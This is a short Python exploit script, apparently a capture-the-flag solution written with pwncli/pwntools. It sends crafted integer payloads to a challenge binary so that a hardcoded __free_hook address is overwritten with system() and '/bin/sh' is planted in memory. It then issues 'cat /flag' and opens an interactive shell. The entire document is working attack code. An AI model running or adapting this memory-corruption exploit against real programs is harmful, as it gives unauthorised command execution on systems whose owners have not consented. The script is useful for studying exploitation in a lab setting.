#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *
from pwnlib.util.proc import wait_for_debugger

cli_script()

io: tube = gift['io']

free_hook_addr = 0x80e09f0
system_addr = 0x8051c60

def get_payload(int_list):
    res = ""
    for i in int_list:
        res += str(i) + " "
    res = res.rstrip()
    info(f"Get payload: {res}")
    return res
wait_for_debugger
opcodes = [0x2a3d, 0x2a3d, 0x10101010, 0x2a3d, 0x2a3d, 0x2a3d]
uses = [free_hook_addr - 8, 0x45, 0x6e69622f, 0x68732f, system_addr]

io.sendline(get_payload(opcodes))
sleep(1)
io.sendline(get_payload(uses))

sleep(1)
io.sendline("cat /flag")

io.interactive()